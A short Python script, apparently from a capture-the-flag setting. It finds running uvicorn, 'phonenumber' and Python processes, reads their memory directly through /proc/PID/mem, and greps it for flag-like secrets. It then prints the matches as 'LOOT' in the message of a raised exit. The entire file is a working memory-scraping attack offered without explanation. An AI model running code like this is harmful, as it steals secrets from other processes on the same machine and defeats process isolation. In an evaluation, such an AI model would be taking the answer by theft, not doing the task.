import os, re, glob, sys

pat = re.compile(rb'[A-Za-z0-9_]{2,15}\{[^}\n]{3,120}\}')
hits = set()

def scan(pid):
    try:
        with open(f"/proc/{pid}/maps") as m:
            regions = []
            for line in m:
                parts = line.split()
                if len(parts) < 2 or "r" not in parts[1]:
                    continue
                a, b = parts[0].split("-")
                regions.append((int(a, 16), int(b, 16)))
        with open(f"/proc/{pid}/mem", "rb") as mem:
            for a, b in regions:
                if b - a > 64 * 1024 * 1024:
                    continue
                try:
                    mem.seek(a)
                    data = mem.read(b - a)
                except Exception:
                    continue
                for mt in pat.findall(data):
                    hits.add(mt.decode("latin1"))
    except Exception:
        pass

targets = []
for pid in os.listdir("/proc"):
    if not pid.isdigit():
        continue
    try:
        cl = open(f"/proc/{pid}/cmdline", "rb").read().decode("latin1")
    except Exception:
        continue
    if any(k in cl for k in ("uvicorn", "phonenumber", "python")) and int(pid) != os.getpid():
        targets.append(pid)

for pid in targets:
    scan(pid)

flaggy = [h for h in hits if re.search(r'(?i)cncc|flag|ctf', h)] or sorted(hits)
raise SystemExit("LOOT_START\npids=%s\n" % targets + "\n".join(sorted(flaggy)[:60]) + "\nLOOT_END")
